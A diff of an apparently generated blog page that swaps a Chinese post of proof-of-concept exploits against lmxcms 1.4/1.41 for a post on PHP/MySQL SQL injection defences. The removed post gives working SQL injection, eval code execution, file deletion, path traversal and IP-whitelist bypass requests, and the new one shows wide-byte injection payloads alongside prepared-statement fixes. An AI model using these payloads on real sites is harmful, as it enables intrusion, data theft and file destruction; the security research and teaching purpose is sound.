@@ -22,37 +22,24 @@
     var CONFIG = {"hostname":"lockcy.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="lmxcms源码审计">
+  <meta name="description" content="^-^">
 <meta property="og:type" content="article">
-<meta property="og:title" content="lmxcms全漏洞poc">
-<meta property="og:url" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/index.html">
+<meta property="og:title" content="php mysql攻防">
+<meta property="og:url" content="https://lockcy.github.io/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/index.html">
 <meta property="og:site_name" content="lockcy&#39;s cave">
-<meta property="og:description" content="lmxcms源码审计">
+<meta property="og:description" content="^-^">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/1.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/2.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/3.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/4.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/5.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/6.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/7.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/8.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/9.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/10.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/11.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/12.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/13.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/14.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/15.png">
-<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/16.png">
-<meta property="article:published_time" content="2022-02-10T06:52:26.000Z">
-<meta property="article:modified_time" content="2022-02-10T07:10:07.656Z">
+<meta property="og:image" content="https://lockcy.github.io/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/1.png">
+<meta property="og:image" content="https://lockcy.github.io/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/2.png">
+<meta property="article:published_time" content="2022-06-13T16:09:01.000Z">
+<meta property="article:modified_time" content="2022-06-13T16:26:37.046Z">
 <meta property="article:author" content="lockcy">
 <meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="php">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/1.png">
+<meta name="twitter:image" content="https://lockcy.github.io/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/1.png">
 
-<link rel="canonical" href="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/">
+<link rel="canonical" href="https://lockcy.github.io/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/">
 
 
 <script id="page-configurations">
@@ -65,7 +52,7 @@
   };
 </script>
 
-  <title>lmxcms全漏洞poc | lockcy's cave</title>
+  <title>php mysql攻防 | lockcy's cave</title>
   
 
 
@@ -182,7 +169,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/">
+    <link itemprop="mainEntityOfPage" href="https://lockcy.github.io/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/harutya.jpg">
@@ -195,7 +182,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          lmxcms全漏洞poc
+          php mysql攻防
         </h1>
 
         <div class="post-meta">
@@ -206,7 +193,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-02-10 14:52:26 / 修改时间：15:10:07" itemprop="dateCreated datePublished" datetime="2022-02-10T14:52:26+08:00">2022-02-10</time>
+              <time title="创建时间：2022-06-14 00:09:01 / 修改时间：00:26:37" itemprop="dateCreated datePublished" datetime="2022-06-14T00:09:01+08:00">2022-06-14</time>
             </span>
 
           
@@ -222,14 +209,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.7k</span>
+              <span>4.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -241,48 +228,52 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>lmxcms源码审计</p>
+        <p>^-^</p>
 <span id="more"></span>
-<p><strong>1.4前台sql注入漏洞</strong><br>c/index/TagsAction.class.php<br>1.构造函数通过_POST方式获取name变量<br>2.p函数对数据校验，过滤关键字+addslashes转义<br>3.通过delHtml函数（strip_tag函数）去除标签对，进行一次url编码<br>4.sql拼接查询</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/1.png" class="">
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/2.png" class="">
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/3.png" class="">
-<p>数据检查后进行了一次urldecode，可以通过两次url编码绕过addslashes函数的转义</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc: &#39;and (updatexml(1,concat(0x7e,(database()),0x7e),1)) and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">两次Urldecode：http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;lmxcms1.4&#x2F;index.php?m&#x3D;tags&amp;a&#x3D;index&amp;name&#x3D;%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%39%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%37%25%33%31%25%32%37%25%33%64%25%32%37%25%33%31</span><br></pre></td></tr></table></figure>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/4.png" class="">
-<p>lmx1.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;lmxcms1.4&#x2F;index.php?m&#x3D;tags&amp;a&#x3D;index&amp;name&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8081</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;jiit711t06f5plsu8fo7bbqla2; XDEBUG_SESSION&#x3D;XDEBUG_ECLIPSE</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-<p>sqlmap：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r lmx1.txt --technique&#x3D;E -v3 --tamper&#x3D;chardoubleencode -p name --dbs</span><br></pre></td></tr></table></figure>
+<h1> mysql （5.5之前）</h1>  
 
-<p><strong>1.4/1.41后台sql注入漏洞</strong><br>c/index/AcquisiAction.class.class.php<br>POST的参数未过滤，但后台本身可以执行sql语句（无回显），此漏洞危害较低</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/5.png" class="">
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc：1&#39; and updatexml(0,concat(0x7e,database()),1) and &#39;1</span><br></pre></td></tr></table></figure>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/6.png" class="">
-<p>c/admin/AcquisAction.class.php 中 311行查询时对获取的lid参数未检验，且sql语句直接拼接，导致sql注入</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/7.png" class="">
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/8.png" class="">
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poc: http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;lmxcms1.4&#x2F;admin.php?m&#x3D;Acquisi&amp;a&#x3D;showCjData&amp;lid&#x3D;-1+union+select+1,1,1,(select+1+and+(updatexml(1,concat(0x7e,(select+database()),0x7e),1))),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</span><br></pre></td></tr></table></figure>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/9.png" class="">
-<p><strong>1.4/1.41绕过ip白名单</strong></p>
-<p>后台ip白名单可通过X-Forwarded-For 绕过</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/10.png" class="">
+<p>1、<br>php.ini 配置 magic_quotes_gpc = On<br>开启魔术引号开关后，输入数据（ _GET _POST _COOKIE 等）中含单引号（ ‘ ）、双引号（ “ ）、反斜线（ \ ）与 NULL（NULL 字符）等字符，都会被加上反斜线转义<br>addslashes 函数用于在上述符号前添加反斜杠转义，与 gpc 的作用大致相同  </p>
+<p>在仅使用 gpc 或 addslashes 函数的情况下  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">    if(!get_magic_quotes_gpc())&#123;</span><br><span class="line">        $value &#x3D; addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">    return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>情况一： 数字型注入  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id&#x3D;-1 or 1&#x3D;1 --</span><br><span class="line">Array ( [0] &#x3D;&gt; 1 [1] &#x3D;&gt; test [2] &#x3D;&gt; test@qq.com )</span><br></pre></td></tr></table></figure>
+<p>修复方法  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id  &#x3D; intval($_GET[&#39;id&#39;]);</span><br></pre></td></tr></table></figure>
+<p>情况二： 宽字节注入<br>mysql 在使用 gbk 编码时，会将两字节认作一个汉字；当 %df%27 和 gpc/addslashes 相遇，%27 前会添加转义字符 %5c ，%df 和 %5c 组成了新的汉字 %df%5c，单引号 %27 则逃逸出来  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 设置编码</span><br><span class="line">mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin1%df%27%20or%201&#x3D;1%20--%20-</span><br><span class="line">SELECT * FROM user WHERE username&#x3D;&#39;admin1運&#39; or 1&#x3D;1 -- -&#39;</span><br><span class="line">Array ( [0] &#x3D;&gt; 1 [1] &#x3D;&gt; test [2] &#x3D;&gt; test@qq.com )</span><br></pre></td></tr></table></figure>
+<p>修复方法  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用过滤函数：</span><br><span class="line">mysql_real_escape_string</span><br><span class="line">设置以二进制形式连接：</span><br><span class="line">mysql_query(&quot;SET character_set_connection&#x3D;gbk, character_set_results&#x3D;gbk,character_set_client&#x3D;binary&quot;);</span><br></pre></td></tr></table></figure>
 
-<p><strong>1.4/1.41后台任意代码执行</strong><br>c/admin/AcquisAction.class.php 中 318行eval执行了$temdata[‘data’]参数，该参数的值是从lmx_cj_list数据表中查询出的array字段的值，而查询时存在sql注入导致该字段可控，从而导致任意代码执行。</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/11.png" class="">
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poc: admin.php?m&#x3D;Acquisi&amp;a&#x3D;showCjData&amp;lid&#x3D;-1+union+select+1,1,1,&#39;1;system(\&#39;ipconfig\&#39;);&#39;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</span><br></pre></td></tr></table></figure>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/12.png" class="">
-<p><strong>1.4/1.41 后台任意文件删除</strong><br>c/admin/FileAction.class.php 中使用unlink方法删除文件，unlink方法调用php unlink方法，此处未对传入的路径做检查，存在任意文件删除。</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/13.png" class="">
+<p>2、<br>情况一： 宽字节注入<br>mysql_real_escape_string（此方法在 php5.5 后不被建议使用，在 php7 中废除）<br>同样可在编码设置有问题的情况下用宽字节绕过<br>需要设置二进制连接避免该问题  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET character_set_connection&#x3D;gbk, character_set_results&#x3D;gbk,character_set_client&#x3D;binary&quot;);</span><br></pre></td></tr></table></figure>
+<p>情况二：二次注入<br>……  </p>
+<h1> mysqli </h1>  
+在 php5.5 后  mysql 等方法被废弃，更提倡使用 mysqli 来连接操作 mysql 数据库。  
 
-<p>poc:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;lmxcms1.4&#x2F;admin.php?m&#x3D;File&amp;a&#x3D;delete HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 97</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost:8081</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8081&#x2F;lmxcms1.4&#x2F;admin.php?m&#x3D;File&amp;a&#x3D;index&amp;type&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">type&#x3D;0&amp;delImages&#x3D;%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87&amp;fid%5B%5D&#x3D;7#####&#x2F;test.txt</span><br></pre></td></tr></table></figure>
-<p>其中test.txt在index.php 同级目录下，且可使用..进行目录穿越。<br><strong>1.4/1.41 后台任意文件读取</strong><br>c/admin/TemplateAction.class.php</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/14.png" class="">
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/15.png" class="">
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/16.png" class="">
-<p>poc:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8081&#x2F;lmxcms1.4&#x2F;admin.php?m&#x3D;Template&amp;a&#x3D;editfile&amp;dir&#x3D;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
+<p>1、<br>转义方式的安全做法  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function check_input($conn, $value)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; 去除斜杠</span><br><span class="line">    if (get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        $value &#x3D; stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#x2F;&#x2F; 如果不是数字则加引号</span><br><span class="line">    if (!is_numeric($value))</span><br><span class="line">    &#123;</span><br><span class="line">        $value &#x3D; &quot;&#39;&quot; . mysqli_real_escape_string($conn, $value) . &quot;&#39;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2、<br>在 mysql 5.1 后，提供了类似于 jdbc 的预处理-参数化查询。它的查询方法是：<br>a. 先预发送一个 sql 模板过去<br>b. 再向 mysql 发送需要查询的参数<br>就好像填空题一样，不管参数怎么注入， mysql 都能知道这是变量，不会做语义解析，起到防注入的效果，这是在 mysql 中完成的。<br> mysqli 默认在服务端预处理  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$host&#x3D;&#39;localhost&#39;;</span><br><span class="line">$dbName&#x3D;&#39;testdb&#39;;</span><br><span class="line">$user&#x3D;&#39;root&#39;;</span><br><span class="line">$pass&#x3D;&#39;123456&#39;;</span><br><span class="line">$mysqli &#x3D; mysqli_connect($host,$user,$pass,$dbName);</span><br><span class="line"></span><br><span class="line">if(mysqli_connect_errno())</span><br><span class="line">&#123;</span><br><span class="line">    echo mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$stmt &#x3D; $mysqli-&gt;prepare(&quot;select * from user where username&#x3D;?&quot;);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;bind_param(&quot;s&quot;,$_GET[&#39;username&#39;]);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">$res &#x3D; $stmt-&gt;get_result();</span><br><span class="line">$row &#x3D; $res-&gt;fetch_assoc();</span><br><span class="line">print_r($row);</span><br><span class="line">$stmt-&gt;close();</span><br><span class="line"></span><br><span class="line">mysqli_close($mysqli);</span><br></pre></td></tr></table></figure>
+<h1> PDO </h1>  
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$pdo &#x3D; new PDO(&quot;mysql:host&#x3D;localhost;dbname&#x3D;testdb;charset&#x3D;utf8&quot;,&#39;root&#39;,&#39;123456&#39;);</span><br><span class="line">$pdo-&gt;exec(&#39;set names utf8&#39;);</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$sql &#x3D; &quot;select * from user where id &#x3D; ?&quot;;</span><br><span class="line">$statement &#x3D; $pdo-&gt;prepare($sql);</span><br><span class="line">$statement-&gt;bindParam(1, $id);</span><br><span class="line">$statement-&gt;execute();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$row &#x3D; $statement-&gt;fetch();</span><br><span class="line">print_r($row);</span><br></pre></td></tr></table></figure>
+
+<p>PHP5.3.6 之前，使用 PDO 预处理过程如下：  </p>
+<img src="/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/1.png" class="">  
+<p>以一种本地预处理的方式向远程服务器提交查询信息，信息还是在本地组装成字符串后向mysql服务器请求；使用 $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); 禁止本地预处理无效。<br>查阅一些资料发现问题所在：有些驱动不支持或有限度地支持本地预处理。如果驱动不能成功预处理当前查询，它将总是回到模拟预处理语句上。在 win 下无法禁止本地预处理，在 linux 下可以禁止。  </p>
+<p>在本地预处理生效且有编码问题的情况下，仍有受到宽字节注入的危险：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pdo &#x3D; new PDO(&quot;mysql:host&#x3D;127.0.0.1;dbname&#x3D;testdb;charset&#x3D;utf8&quot;,&#39;root&#39;,&#39;123456&#39;);</span><br><span class="line">&#x2F;&#x2F; $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false);</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;select * from user1 where uid &#x3D; ?&quot;;</span><br><span class="line">$statement &#x3D; $pdo-&gt;prepare($sql);</span><br><span class="line">$pdo-&gt;exec(&#39;set names gbk&#39;);</span><br><span class="line"></span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$statement-&gt;bindParam(1, $id);</span><br><span class="line"></span><br><span class="line">$statement-&gt;execute();</span><br><span class="line">$row &#x3D; $statement-&gt;fetch();</span><br><span class="line">print_r($row);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;%df%27%20or%201&#x3D;1%20--%20-</span><br></pre></td></tr></table></figure>
+
+
+<p>php5.3.6 及之后的版本预处理过程如下<br>默认还是在本地预处理，但如果禁用本地预处理的情况会先传送模板，再传送数据，如下图所示  </p>
+<img src="/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/2.png" class="">  
+<p>禁用本地预处理的可以有效防止宽字节注入。  </p>
+<h1>小结</h1>  
+
+<p><strong>注：以上测试均在 windows 下 php5 环境下测试</strong><br><strong>php版本小于 5.3.6(5.2.17) ：</strong><br><strong>无法关闭本地预处理，易受宽字节注入影响， linux 下可关闭本地预处理（未测试）</strong><br><strong>php版本大于 5.3.6(5.4.45) ：<br>**可关闭本地预处理，在关闭本地预处理的情况下不受宽字节注入影响</strong><br>测试结果与网上一些资料有点出入，有时间会深入再看看  </p>
+<p><strong>最好设置 $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false);  避免本地预处理</strong><br><strong>若使用 php 5.3.6+ , 请在在 PDO 的 DSN 中指定 charset 属性</strong><br><strong>宽字节注入危害还是很大的</strong>  </p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000008117968">https://segmentfault.com/a/1190000008117968</a><br><a target="_blank" rel="noopener" href="https://www.iteye.com/blog/zhangxugg-163-com-1835721">https://www.iteye.com/blog/zhangxugg-163-com-1835721</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/216336.html">https://www.freebuf.com/articles/web/216336.html</a></p>
 
     </div>
 
@@ -303,12 +294,12 @@
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
 
-  <p><span>本文标题:</span>lmxcms全漏洞poc</a></p>
+  <p><span>本文标题:</span>php mysql攻防</a></p>
   <p><span>文章作者:</span></a></p>
-  <p><span>发布时间:</span>2022年02月10日 - 14:52:26</p>
-  <p><span>最后更新:</span>2022年02月10日 - 15:10:07</p>
-  <p><span>原始链接:</span><a href="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/" title="lmxcms全漏洞poc">https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2022年06月14日 - 00:09:01</p>
+  <p><span>最后更新:</span>2022年06月14日 - 00:26:37</p>
